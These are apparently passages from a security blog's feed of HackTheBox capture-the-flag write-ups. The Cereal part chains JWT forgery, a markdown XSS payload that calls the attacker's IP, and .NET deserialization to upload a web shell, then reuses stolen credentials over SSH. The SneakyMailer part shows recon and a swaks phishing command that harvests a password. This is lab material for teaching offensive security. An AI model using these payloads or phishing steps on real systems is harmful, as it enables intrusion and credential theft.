</span></span><span class="line"><span class="cl">		<span class="nx">UserId</span><span class="p">:</span>   <span class="s">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Username</span><span class="p">:</span> <span class="s">&#34;iamf&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Token</span><span class="p">:</span>    <span class="nx">jwt</span><span class="p">.</span><span class="nf">CreateToken</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">currentUser</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="nx">cu</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It produces the following output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3»
</span></span><span class="line"><span class="cl">$ go run main.go
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;userId&#34;</span>:<span class="s2">&#34;1&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;iamf&#34;</span>,<span class="s2">&#34;token&#34;</span>:<span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class="o">}</span>
</span></span></code></pre></div><h4 id="login">Login</h4>
<p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of  <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and the response looklike.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<blockquote>
<p>I decided to mix it with images hehe.</p>
</blockquote>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class="line"><span class="cl"><span class="na">        [HttpGet(&#34;{id}&#34;)]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">IActionResult</span> <span class="n">Get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">string</span> <span class="n">json</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Requests</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">RequestId</span> <span class="p">==</span> <span class="n">id</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">().</span><span class="n">JSON</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;objectdataprovider&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;windowsidentity&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;system&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">BadRequest</span><span class="p">(</span><span class="k">new</span> <span class="p">{</span> <span class="n">message</span> <span class="p">=</span> <span class="s">&#34;The cereal police have been dispatched.&#34;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">cereal</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="n">DeserializeObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="k">new</span> <span class="n">JsonSerializerSettings</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">Auto</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Ok</span><span class="p">(</span><span class="n">cereal</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="na">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class="line"><span class="cl"><span class="na">[HttpGet(&#34;{id}&#34;)]</span>
</span></span></code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;objectdataprovider&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;windowsidentity&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;system&#34;</span><span class="o">))</span>
</span></span></code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">DownloadHelper</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="n">String</span> <span class="n">_URL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="n">String</span> <span class="n">_FilePath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">String</span> <span class="n">URL</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="k">void</span> <span class="n">Download</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="n">WebClient</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">_URL</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">_FilePath</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wc</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="n">_URL</span><span class="p">,</span> <span class="n">ReplaceLastOccurrence</span><span class="p">(</span><span class="n">_FilePath</span><span class="p">,</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;\\21098374243-&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">Accordion</span><span class="p">.</span><span class="nx">Toggle</span> <span class="nx">as</span><span class="o">=</span><span class="p">{</span><span class="nx">Button</span><span class="p">}</span> <span class="nx">variant</span><span class="o">=</span><span class="s2">&#34;link&#34;</span> <span class="nx">eventKey</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;expand&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="nx">requestData</span> <span class="o">&amp;&amp;</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">==</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">MarkdownPreview</span> <span class="nx">markedOptions</span><span class="o">=</span><span class="p">{{</span> <span class="nx">sanitize</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}}</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span><span class="p">}</span> <span class="o">/&gt;</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span></code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre tabindex="0"><code>[XSS](javascript: document.write`&lt;img src=&#39;http://10.10.14.3/iamf&#39;/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">[<span class="nt">XSS</span>](<span class="na">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>Putting it all together:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I&rsquo;ve made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h4 id="ssh---sonny">SSH - sonny</h4>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.2» 
</span></span><span class="line"><span class="cl">$ ssh sonny@cereal.htb
</span></span><span class="line"><span class="cl">sonny@cereal.htb<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.1817<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sonny@CEREAL C:<span class="se">\U</span>sers<span class="se">\s</span>onny&gt;dir desktop<span class="se">\ </span>
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.                   
</span></span><span class="line"><span class="cl"> Volume Serial Number is C4EF-2153                 
</span></span><span class="line"><span class="cl">                                                   
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\U</span>sers<span class="se">\s</span>onny<span class="se">\d</span>esktop               
</span></span><span class="line"><span class="cl">                                                   
</span></span><span class="line"><span class="cl">11/16/2020  05:19 AM    &lt;DIR&gt;          .           
</span></span><span class="line"><span class="cl">11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
</span></span><span class="line"><span class="cl">06/07/2021  09:59 PM                <span class="m">34</span> user.txt    
</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">34</span> bytes      
</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   7,621,619,712 bytes free 
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/hackthebox/sneakymailer/</link>
      <pubDate>Sat, 28 Nov 2020 18:27:21 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/sneakymailer/</guid>
      <description>Example of a phishing attack and PyPI package exploitation</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box that features a phishing attack. The credentials obtained through phishing allow me to access one of the users&rsquo; mailboxes and obtain another credentials for FTP. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Sudo exploitation on <code>pip3</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Imap</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">21/tcp   open  ftp      vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">25/tcp   open  smtp     Postfix smtpd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
</span></span><span class="line"><span class="cl">80/tcp   open  http     nginx 1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://sneakycorp.htb
</span></span><span class="line"><span class="cl">143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: ENABLE STARTTLS <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: ENABLE <span class="nv">AUTH</span><span class="o">=</span>PLAIN CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 NAMESPACE
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http     nginx 1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to nginx!
</span></span><span class="line"><span class="cl">Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><div class="img-container"><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt=""  /></div>
</p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees&rsquo; data of SneakyCorp.</p>
<p><div class="img-container"><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt=""  /></div>
</p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><div class="img-container"><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt=""  /></div>
</p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ cat team <span class="p">|</span> egrep -o <span class="s2">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> <span class="p">|</span> tr -d <span class="s2">&#34;&lt;&gt;&#34;</span> <span class="p">|</span> tee emails.list
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt=""  /></div>
</p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><div class="img-container"><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt=""  /></div>
</p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ swaks --server <span class="s1">&#39;10.10.10.197&#39;</span> --to <span class="sb">`</span>cat emails.list <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span><span class="sb">`</span> --from admin@sneakymailer.htb --body <span class="s2">&#34;http://10.10.14.42/&#34;</span>
</span></span></code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><div class="img-container"><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt=""  /></div>
</p>
<p>The request body contains this data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></span></span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></span></span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><div class="img-container"><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt=""  /></div>
</p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><div class="img-container"><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt=""  /></div>
</p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><div class="img-container"><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt=""  /></div>
</p>
